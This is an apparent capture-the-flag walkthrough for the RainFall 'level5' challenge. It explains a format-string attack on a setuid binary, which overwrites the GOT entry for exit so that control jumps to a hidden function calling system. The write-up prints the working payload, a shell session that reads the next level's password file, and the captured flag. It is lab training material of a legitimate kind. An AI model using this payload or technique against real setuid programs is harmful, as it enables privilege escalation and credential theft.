# level5 walkthrough
Given setuid binary, lets disassemble it:

    (gdb) disass main
    Dump of assembler code for function main:
    0x08048504 <+0>:	push   ebp
    0x08048505 <+1>:	mov    ebp,esp
    0x08048507 <+3>:	and    esp,0xfffffff0
    0x0804850a <+6>:	call   0x80484c2 <n>
    0x0804850f <+11>:	leave
    0x08048510 <+12>:	ret
    End of assembler dump.

There is just an "n" function call, lets disassemble it: 

    (gdb) disass n
    Dump of assembler code for function n:
    0x080484c2 <+0>:	push   ebp
    0x080484c3 <+1>:	mov    ebp,esp
    0x080484c5 <+3>:	sub    esp,0x218
    0x080484cb <+9>:	mov    eax,ds:0x8049848
    0x080484d0 <+14>:	mov    DWORD PTR [esp+0x8],eax
    0x080484d4 <+18>:	mov    DWORD PTR [esp+0x4],0x200
    0x080484dc <+26>:	lea    eax,[ebp-0x208]
    0x080484e2 <+32>:	mov    DWORD PTR [esp],eax
    0x080484e5 <+35>:	call   0x80483a0 <fgets@plt>
    0x080484ea <+40>:	lea    eax,[ebp-0x208]
    0x080484f0 <+46>:	mov    DWORD PTR [esp],eax
    0x080484f3 <+49>:	call   0x8048380 <printf@plt>
    0x080484f8 <+54>:	mov    DWORD PTR [esp],0x1
    0x080484ff <+61>:	call   0x80483d0 <exit@plt>
    End of assembler dump.

"n" function  is similar to the previous two levels with one difference, there is no conditional jump on exploit and it exists after printf.
There is no point in changing "n" function return address because it calls exit at the end and never returns.
We need to change the exit address on exploit address inside GOT.
The GOT (Global Offset Table) is a table of addresses in the data section, it contains the shared library functions addresses.
Also GOT is writable and whenever the function exit() is called (GOT entry of the function is looked up first) the program will jump to that address.
But first we need to have exploit address to overwrite with.
Lets try to find if there is any exploit contained inside this binary:

    (gdb) info functions
    All defined functions:

    Non-debugging symbols:
    0x08048334  _init
    0x08048380  printf
    0x08048380  printf@plt
    0x08048390  _exit
    0x08048390  _exit@plt
    0x080483a0  fgets
    0x080483a0  fgets@plt
    0x080483b0  system
    0x080483b0  system@plt
    0x080483c0  __gmon_start__
    0x080483c0  __gmon_start__@plt
    0x080483d0  exit
    0x080483d0  exit@plt
    0x080483e0  __libc_start_main
    0x080483e0  __libc_start_main@plt
    0x080483f0  _start
    0x08048420  __do_global_dtors_aux
    0x08048480  frame_dummy
    0x080484a4  o
    0x080484c2  n
    0x08048504  main
    0x08048520  __libc_csu_init
    0x08048590  __libc_csu_fini
    0x08048592  __i686.get_pc_thunk.bx
    0x080485a0  __do_global_ctors_aux
    0x080485cc  _fini

There is not used "o" function, lets take a look at it:

    (gdb) disass o
    Dump of assembler code for function o:
    0x080484a4 <+0>:	push   ebp
    0x080484a5 <+1>:	mov    ebp,esp
    0x080484a7 <+3>:	sub    esp,0x18
    0x080484aa <+6>:	mov    DWORD PTR [esp],0x80485f0
    0x080484b1 <+13>:	call   0x80483b0 <system@plt>
    0x080484b6 <+18>:	mov    DWORD PTR [esp],0x1
    0x080484bd <+25>:	call   0x8048390 <_exit@plt>
    End of assembler dump.

Great, we found the code which we can exploit, exit function address in GOT should point to the "o" function.
Lets find exit function address inside GOT, we can use objdump tool with -R flag (display dynamic relocation entries):
    level5@RainFall:~$ objdump -R ./level5

    ./level5:     file format elf32-i386

    DYNAMIC RELOCATION RECORDS
    OFFSET   TYPE              VALUE
    08049814 R_386_GLOB_DAT    __gmon_start__
    08049848 R_386_COPY        stdin
    08049824 R_386_JUMP_SLOT   printf
    08049828 R_386_JUMP_SLOT   _exit
    0804982c R_386_JUMP_SLOT   fgets
    08049830 R_386_JUMP_SLOT   system
    08049834 R_386_JUMP_SLOT   __gmon_start__
    08049838 R_386_JUMP_SLOT   exit
    0804983c R_386_JUMP_SLOT   __libc_start_main

exit function GOT entree is 38980408 (converted to little endian).

Lets find offset from stack to our buffer:

    level5@RainFall:~$ ./level5
    AAAA %p %p %p %p %p
    AAAA 0x200 0xb7fd1ac0 0xb7ff37d0 0x41414141 0x20702520

"o" finction address is 134513824 in decimal (sub 4 because of the exit function address being printed).
Now we need to pass exit function address instead of "AAAA" and overwrite with "o" function address using already known technique:

    level5@RainFall:~$ python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"' > /tmp/level5/exploit
    level5@RainFall:~$ cat /tmp/level5/exploit - | ./level5
    whoami
    level6
    cat /home/user/level6/.pass
    d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
